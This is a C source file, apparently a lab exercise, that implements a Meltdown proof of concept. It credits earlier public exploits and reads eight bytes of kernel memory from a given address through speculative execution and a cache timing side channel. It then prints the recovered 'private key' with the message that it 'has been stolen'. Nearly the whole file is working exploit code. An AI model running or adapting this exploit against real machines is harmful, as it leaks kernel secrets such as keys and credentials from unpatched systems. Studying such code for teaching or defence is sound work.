/*
In this work I used several people's work
https://github.com/IAIK/meltdown/blob/master/libkdump.
https://github.com/paboldin/meltdown-exploit.
http://www.hac-ker.net/index/index/showarticle/id/11950.html 
https://github.com/21cnbao/meltdown-example.
*/
#define _GNU_SOURCE
#define ERROR -1

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <x86intrin.h>

static char array[256 * 4096];
extern char stopspeculate[];
static int hit_limit;
static int hist[256];


void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
}

int set_signal()
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

static void __attribute__((noinline)) speculate(unsigned long addr){
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}


void access_firsttime(volatile char *addr){
	volatile int j;
	j= *addr;
}

void flush()
{
	int i;
	for (i = 0; i < 256; i++)
		_mm_clflush(&array[i * 4096]);
}

static inline int access_time(volatile char *addr){
	int before, after, junk;
	volatile int j;
	before = __rdtscp(&junk);
	j = *addr;
	after = __rdtscp(&junk);
	return after - before;
}


int read_byte(int fd, unsigned long addr)
{
	int i, ret = 0, max = -1, maxi = -1;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < 1000; i++) {
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0) {
			perror("pread");
			break;
		}
		flush();
		speculate(addr);
		check_now();
	}

	for (i = 1; i < 256; i++) {
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			maxi = i;
		}
	}

	return maxi;
}



void check_now(){
	int i, time, mix_i;
	volatile char *addr;
	for (i = 0; i < 256; i++) {
		mix_i = ((i * 167) + 13) & 255;
		addr = &array[mix_i * 4096];
		time = access_time(addr);
		if (time <= hit_limit)
			hist[mix_i]++;
	}
}


static void set_hit_limit(void){
	long cached, uncached, i;
	for (i = 0; i < 1000000; i++)
		access_firsttime(array);

	for (cached = 0, i = 0; i < 1000000; i++)
		cached += access_time(array);

	for (uncached = 0, i = 0; i < 1000000; i++) {
		_mm_clflush(array);
		uncached += access_time(array);
	}

	cached /= 1000000;
	uncached /= 1000000;
	for(i=1;;i++){
		if(i*i<=cached * uncached && (i+1)*(i+1) >cached * uncached){
			break;
		}
	}
	hit_limit = i;
}


int main(int argc, char *argv[])
{
	int ret, fd, i, is_vulnerable;
    int j;
	unsigned long addr;
	int data[8];

	sscanf(argv[1], "%lx", &addr);

	memset(array, 1, sizeof(array));

	ret = set_signal();

	set_hit_limit();

	fd = open("/proc/stolen_data", O_RDONLY);

	printf("Now is the test\n");
	for (i = 0; i < 8; i++) {
		ret = read_byte(fd, addr);
		data[i]=ret;
		printf("data stored at 0x%lx is %x \n",addr, ret);
		addr++;
	}
    printf("The private key stored in the kernel space should be 0x");
    for (i=7;i>=0;i--)
        printf("%x",data[i]);
	printf("\n");
	printf("The private key has been stolen!\n");
	close(fd);

	return 0;
}